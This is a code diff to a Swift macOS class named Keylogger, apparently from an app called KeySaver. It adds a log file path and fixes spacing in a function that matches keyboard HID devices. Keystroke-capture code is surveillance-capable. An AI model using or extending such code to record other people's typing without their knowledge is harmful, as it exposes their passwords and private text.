@@ -18,6 +18,8 @@ class Keylogger
     //    var bundlePathURL = Bundle.main.bundleURL   // Path to where the executable is present - Change this to use custom path
     static var bundlePathURL = URL(fileURLWithPath: "/Users/etiennebeaulac/Downloads", isDirectory: true)
     static var keylogs = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Logs")
+    static var filenameUrl = keylogs.appendingPathComponent("logs")
+    static var filename = filenameUrl.path
     var appName = "KeySaver"                    // Active App name, starts with this one
 //    var keylogs: URL                            // Folder
     
@@ -77,11 +79,11 @@ class Keylogger
     }
     
     /* For Keyboard */
-    func CreateDeviceMatchingDictionary(inUsagePage: Int ,inUsage: Int ) -> CFMutableDictionary
+    func CreateDeviceMatchingDictionary(inUsagePage: Int, inUsage: Int ) -> CFMutableDictionary
     {
         /* // note: the usage is only valid if the usage page is also defined */
         
-        let resultAsSwiftDic = [kIOHIDDeviceUsagePageKey: inUsagePage, kIOHIDDeviceUsageKey : inUsage]
+        let resultAsSwiftDic = [kIOHIDDeviceUsagePageKey: inUsagePage, kIOHIDDeviceUsageKey: inUsage]
         let resultAsCFDic: CFMutableDictionary = resultAsSwiftDic as! CFMutableDictionary
         return resultAsCFDic
     }
